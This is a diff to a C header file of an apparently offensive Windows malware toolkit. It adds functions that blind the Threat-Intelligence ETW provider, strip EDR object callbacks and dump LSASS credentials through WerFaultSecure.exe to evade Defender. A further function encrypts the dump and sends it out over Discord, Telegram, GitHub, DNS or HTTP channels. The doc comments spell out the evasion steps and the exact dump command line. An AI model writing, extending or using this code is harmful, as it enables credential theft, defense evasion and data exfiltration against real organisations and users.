@@ -226,6 +226,28 @@ bool jocky_disable_edr_callbacks(jocky_byovd_t* ctx);
  * Disables all kernel ETW write paths for this boot session. */
 bool jocky_disable_etw(jocky_byovd_t* ctx);
 
+/* Target the Microsoft-Windows-Threat-Intelligence ETW provider specifically.
+ *
+ * Two passes:
+ *  A) Locate EtwTiLog* exports in ntoskrnl and zero their per-function enable
+ *     flags via the same RIP-relative scan used by jocky_disable_etw().
+ *  B) Scan ntoskrnl image for the TI provider GUID and zero the IsEnabled
+ *     counter in the _ETW_GUID_ENTRY, disabling the provider at registration
+ *     level regardless of which EtwTiLog* code path fires.
+ *
+ * Call this in addition to jocky_disable_etw() — they target different flags. */
+bool jocky_disable_etw_ti(jocky_byovd_t* ctx);
+
+/* Walk _OBJECT_TYPE.CallbackList for PsProcessType and PsThreadType, and
+ * disable (Active=FALSE, PreOperation=NULL, PostOperation=NULL) every
+ * registered ObRegisterCallbacks entry.
+ *
+ * EDR drivers use these object callbacks to intercept OpenProcess/OpenThread
+ * and strip dangerous access rights (PROCESS_VM_READ, PROCESS_ALL_ACCESS).
+ * This removes them independently of the Ps*Notify callback arrays targeted
+ * by jocky_disable_edr_callbacks(). */
+bool jocky_disable_ob_callbacks(jocky_byovd_t* ctx);
+
 /* Zero EPROCESS.Protection for the given PID, removing PPL/PP shielding.
  * After this call, the process can be opened with any desired access. */
 bool jocky_strip_ppl(jocky_byovd_t* ctx, uint32_t pid);
@@ -331,6 +353,36 @@ bool jocky_exfil_telegram(const char* bot_token, const char* chat_id,
  * token must have the gist scope. */
 bool jocky_exfil_github(const char* token, const char* gist_id,
                          const uint8_t* data, size_t data_len);
+
+/* ── LSASS credential dump ─────────────────────────────────────────────── */
+
+/* Find LSASS's PID by walking the process list via NtQuerySystemInformation.
+ * Never calls OpenProcess on LSASS.  Returns 0 on failure. */
+uint32_t jocky_lsass_pid(void);
+
+/* Dump LSASS memory using WerFaultSecure.exe (Microsoft-signed PPL process).
+ *
+ * Spawns WerFaultSecure with:
+ *   -u -p <lsass_pid> -ip <our_pid> -s 524288 /type 2
+ * waits for it to write %LOCALAPPDATA%\CrashDumps\lsass.exe.<pid>.dmp,
+ * reads the dump into *out_buf, deletes the file, and returns.
+ *
+ * Our process never opens a handle to LSASS; Defender sees the trusted
+ * WerFaultSecure binary performing the dump, not us.
+ *
+ * *out_buf must be freed by the caller with jocky_free().
+ * Requires SeDebugPrivilege or SYSTEM. */
+bool jocky_lsass_dump_werfault(uint8_t** out_buf, size_t* out_size);
+
+/* Convenience: dump LSASS, RC4-encrypt the result (16-byte prepended key),
+ * and ship via the specified exfil channel.
+ *
+ * exfil_url  — channel endpoint (webhook URL / "token:chat_id" / gist /
+ *              DNS zone / HTTP URL — depends on exfil_type)
+ * exfil_type — one of: "discord" | "telegram" | "github" | "dns" | "http"
+ *
+ * Returns true only if the dump was obtained and successfully transmitted. */
+bool jocky_lsass_exfil(const char* exfil_url, const char* exfil_type);
 
 #endif /* _WIN32 (exfiltration) */
 
